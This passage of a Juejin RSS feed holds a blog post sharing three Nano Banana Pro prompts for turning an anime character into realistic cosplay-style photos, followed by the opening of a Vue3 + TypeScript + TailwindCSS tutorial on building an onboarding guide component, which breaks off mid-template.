<p>本文的解析方案可直接应用于商品展示、价格监控、库存管理、SKU 下单等核心业务场景，兼顾通用性与品类适配性，确保多规格商品数据的准确解析。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[太好看了！3 个动漫变真人 Nano Banana Pro 提示词]]></title>    <link>https://juejin.cn/post/7579920818870206506</link>    <guid>https://juejin.cn/post/7579920818870206506</guid>    <pubDate>2025-12-05T03:48:23.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7579920818870206506" data-draft-id="7579843977849143350" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="太好看了！3 个动漫变真人 Nano Banana Pro 提示词"/> <meta itemprop="keywords" content="前端,人工智能,AIGC"/> <meta itemprop="datePublished" content="2025-12-05T03:48:23.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="冴羽"/> <meta itemprop="url" content="https://juejin.cn/user/712139234359182"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            太好看了！3 个动漫变真人 Nano Banana Pro 提示词
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/712139234359182/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    冴羽
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-05T03:48:23.000Z" title="Fri Dec 05 2025 03:48:23 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-05
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读3分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">前言</h2>
<p>本篇我和你分享 3 个将动漫变成真人的 Nano Banana Pro 提示词。</p>
<p>原图以最近很火的《罗小黑战记 2》中的鹿野为例：</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/de6e880ac8d4422db8462d20cdb8d6e6~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Ya05769:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765511302&amp;x-signature=nBVBvAR0zeXwf7INdXiyyfzvPbM%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-1">动漫直接转真人</h2>
<p>提示词：</p>
<blockquote>
<p>1:1 变真人</p>
</blockquote>
<p>生成效果如下：</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/82cceaa6e25642e1b888b579d6a04b46~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Ya05769:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765511302&amp;x-signature=pHDipme3dg9%2FIyf2VCwgLHk1Xmk%3D" alt="" loading="lazy"/></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c6b1b102435e4f88b49c5b3661455fd7~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Ya05769:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765511302&amp;x-signature=QmLVj1eTq2DczMx5V81LYQ%2BduRg%3D" alt="" loading="lazy"/></p>
<p>这个提示词也可以：</p>
<blockquote>
<p>精确复制原插图中的姿势、体态、手势、面部表情和拍摄角度,生成一张女孩在 Comiket 上 cosplay 这个插图的高度细节照片。保持相同的角度、透视和构图,不做任何偏离。</p>
</blockquote>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/66a875f1b37e4b438310d7f4fa826520~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Ya05769:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765511302&amp;x-signature=truu9%2FFFbSOKLeUA3b%2BhfOjyjFA%3D" alt="" loading="lazy"/></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b1ffd60870054f2bb93df767ffe7b2f3~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Ya05769:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765511302&amp;x-signature=XIoSy7ozwEtcf4ikPjUxjlgAXEA%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-2">漫展 Cos 达人</h2>
<p>提示词：</p>
<blockquote>
<p>一张电影感的、4K 分辨率的纪实风格照片，画面中一位 Coser 和一个真人大小的易拉宝展架，在熙熙攘攘的动漫展会大厅里并排站立。</p>
<p>易拉宝展架: 一个高大的（85x200 厘米）可伸缩易拉宝展架，其铝合金卷轴底座和顶部夹杆都清晰可见。印刷品是高分辨率的，具有哑光和防眩光效果，并且是无边框的满版印刷。</p>
<p>Coser 与匹配度 (关键): Coser 穿着一套与展架上角色完美匹配、1:1 屏幕还原度的 Cosplay 服装。Coser 的姿势与展架上的姿势完全相同，而不是镜像。每个细节都必须精确匹配：</p>
<p>姿势： 匹配所有的肢体角度、重心分布、头部倾斜、视线方向和手指形状。</p>
<p>服装： 精确匹配发型、剪裁、图案、颜色和配饰。</p>
<p>道具： 所有道具都必须出现，并且握在同一只手中，朝向也与展架上一致。</p>
<p>颜色： 调色板严格锁定为原始角色的设计。</p>
<p>场景与相机:</p>
<p>场地： 艺术家小巷的摊位风格，背景是中等虚化程度的人群。</p>
<p>灯光： 来自展会柔光箱的明亮、均匀的灯光。</p>
<p>机位角度： 平视，略微仰拍。</p>
<p>镜头与设置： 45mm 镜头，f/3.2 光圈，营造出浅景深效果，主体清晰，背景有漂亮的虚化。无动态模糊。</p>
<p>整体风格: 照片般逼真，具有最高的清晰度和细节。画面中任何地方都绝对不允许出现品牌标志或清晰可读的文字。</p>
<p>负面提示词 (Negative Prompt)</p>
<p>镜像姿势, 不同的姿势, 错误的姿势, 另一套服装, 重新设计, 重新诠释, 风格变体, 品牌标志, 清晰的文字, 签名, 水印, 卷边的展架, 白色边框, 泡沫板, 立牌, 模糊的展架, 模糊的主体, 过度曝光, 多余的肢体, 畸形的手, 缺少道具, 错误的颜色, 太阳镜, 女仆装。</p>
</blockquote>
<p>生成效果如下：</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a7278cdb7c084f7cb1b1fc74f2ec5cc0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Ya05769:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765511302&amp;x-signature=1MBBsHfdNYwZ%2BxwaxSoW2bwl8I0%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-3">动漫与现实分割肖像</h2>
<p>提示词：</p>
<blockquote>
<p>一张 16:9 的电影式宽屏镜头，画面中央是上传图片中的人物头像，脸部被垂直分割成两半。一条清晰的黑线将两种不同的画风从中间分开。[左半边]：经典的动漫风格。[右半边]：写实风格。面部特征完美契合，构成一幅浑然一体的角色肖像，使用虚幻引擎 5 渲染而成。</p>
</blockquote>
<p>生成效果如下：</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/52aa4db46d7f46a287429c311ffd6823~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Ya05769:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765511302&amp;x-signature=kiBDeh2nElpSCXPcCU%2FLFT87Vvs%3D" alt="" loading="lazy"/></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/bdd78eb0f691492696d2330792737798~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Ya05769:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765511302&amp;x-signature=UjLxE%2B1znV4gTsO%2FOh01Djxwog8%3D" alt="" loading="lazy"/></p>
<p>原文链接：<a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2FAENFcFHlDXAmC_X6LZu7QA" target="_blank" title="https://mp.weixin.qq.com/s/AENFcFHlDXAmC_X6LZu7QA" ref="nofollow noopener noreferrer">太好看了！3 个动漫变真人 Nano Banana Pro 提示词</a></p>
<p>最后，欢迎你关注我的公众号：<strong>冴羽</strong>，或者搜索 <strong>yayujs</strong> ，10 年技术博主，各种系列文章，持续分享最新资讯、前端编程知识、AI 干货</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Vue3 + TS + TailwindCSS 操作引导组件开发逐行解析]]></title>    <link>https://juejin.cn/post/7579887768227692578</link>    <guid>https://juejin.cn/post/7579887768227692578</guid>    <pubDate>2025-12-05T03:24:35.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7579887768227692578" data-draft-id="7579851956211843124" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Vue3 + TS + TailwindCSS 操作引导组件开发逐行解析"/> <meta itemprop="keywords" content="Vue.js"/> <meta itemprop="datePublished" content="2025-12-05T03:24:35.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="码途潇潇"/> <meta itemprop="url" content="https://juejin.cn/user/2386391857112611"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Vue3 + TS + TailwindCSS 操作引导组件开发逐行解析
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2386391857112611/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    码途潇潇
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-05T03:24:35.000Z" title="Fri Dec 05 2025 03:24:35 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-05
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读9分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">Vue3 + TS + TailwindCSS 操作引导组件开发逐行解析</h2>
<h2 data-id="heading-1">1.设计稿&amp;效果图</h2>
<p>设计稿：</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/bdca9ad2af844e9688db8998fabf067d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56CB6YCU5r2H5r2H:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765509875&amp;x-signature=B1f5nhOj9rxGZ2Z3Kc9GxvvIS24%3D" alt="image-20251203095001272" loading="lazy"/></p>
<p>效果图：</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7bb8714db11f4bada6eae51116978f43~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56CB6YCU5r2H5r2H:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765509875&amp;x-signature=r1yBW8ucNmq3heWXRkQF96fJcno%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-2">2.业务背景&amp;业务需求</h2>
<p><strong>业务背景：</strong></p>
<p>产品中使用了 3D 高斯游览（3D Gaussian Splatting）技术，用户可以在三维场景中进行自由浏览、旋转视角、缩放等交互操作。然而，对于首次使用的用户来说，这类 3D 交互存在一定的学习成本。</p>
<p><strong>业务需求：</strong></p>
<p>为降低用户上手难度，需要在 3D 游览开始时在右下角提供一段 操作引导。</p>
<p>该引导用于：</p>
<ul>
<li>清晰说明 “移动视角 / 旋转视角 / 缩放” 的操作方式</li>
<li>通过图示和说明文案提升理解速度</li>
<li>提高用户在 3D 场景中的交互效率与体验</li>
<li>避免用户因不会操作而误以为产品不够友好</li>
</ul>
<p><strong>功能概述：</strong></p>
<p>系统在进入 3D 游览界面时弹出一个指南组件，引导用户理解基础操作。用户可通过左右切换示意图，阅读提示信息，并在了解后点击“知道了”关闭提示</p>
<h2 data-id="heading-3">3.代码设计</h2>
<p>文件结构：</p>
<pre><code class="hljs language-bash" lang="bash">GSview/
├─ components/
│  └─ Guide.vue         <span class="hljs-comment"># 操作引导组件</span>
├─ index.vue            <span class="hljs-comment"># 页面入口</span>
└─ settings.ts          <span class="hljs-comment"># 操作引导配置</span>
</code></pre>
<p>本次的目标就是实现 Guide.vue,一些相关的配置写在 settings.ts 中</p>
<h3 data-id="heading-4">3.1 html骨架</h3>
<p>Guide.vue 中：</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"guide-container"</span> <span class="hljs-attr">v-if</span>=<span class="hljs-string">"isShow"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"guide-container-header"</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"guide-container-tabs"</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"guide-container-tabs-header"</span>&gt;</span>移动视角<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"guide-container-tabs-content"</span>&gt;</span>
          <span class="hljs-tag">&lt;<span class="hljs-name">div</span>
            <span class="hljs-attr">:class</span>=<span class="hljs-string">"[
              'guide-container-tabs-content-item',
              activeTab === item.value ? 'tab-active' : '',
            ]"</span>
            <span class="hljs-attr">v-for</span>=<span class="hljs-string">"item in GuideMoveTabConfig"</span>
            <span class="hljs-attr">:key</span>=<span class="hljs-string">"item.value"</span>
            @<span class="hljs-attr">click</span>=<span class="hljs-string">"handleTabClick(item.value)"</span>
          &gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">span</span>&gt;</span>{{ item.label }}<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span>
          <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
      <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"guide-container-tabs-line"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"guide-container-tabs"</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"guide-container-tabs-header"</span>&gt;</span>旋转视角<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"guide-container-tabs-content"</span>&gt;</span>
          <span class="hljs-tag">&lt;<span class="hljs-name">div</span>
            <span class="hljs-attr">:class</span>=<span class="hljs-string">"[
              'guide-container-tabs-content-item',
              activeTab === item.value ? 'tab-active' : '',
            ]"</span>
            <span class="hljs-attr">v-for</span>=<span class="hljs-string">"item in GuideRotateTabConfig"</span>
            <span class="hljs-attr">:key</span>=<span class="hljs-string">"item.value"</span>
            @<span class="hljs-attr">click</span>=<span class="hljs-string">"handleTabClick(item.value)"</span>
          &gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">span</span>&gt;</span>{{ item.label }}<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span>
          <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
      <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"guide-container-tabs-line"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"guide-container-tabs guide-container-tabs-last"</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"guide-container-tabs-header"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"guide-container-tabs-content"</span>&gt;</span>
          <span class="hljs-tag">&lt;<span class="hljs-name">div</span>
            <span class="hljs-attr">:class</span>=<span class="hljs-string">"[
              'guide-container-tabs-content-item',
              activeTab === item.value ? 'tab-active' : '',
            ]"</span>
            <span class="hljs-attr">v-for</span>=<span class="hljs-string">"item in GuideScaleTabConfig"</span>
            <span class="hljs-attr">:key</span>=<span class="hljs-string">"item.value"</span>
            @<span class="hljs-attr">click</span>=<span class="hljs-string">"handleTabClick(item.value)"</span>
          &gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">span</span>&gt;</span>{{ item.label }}<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span>
          <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
      <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
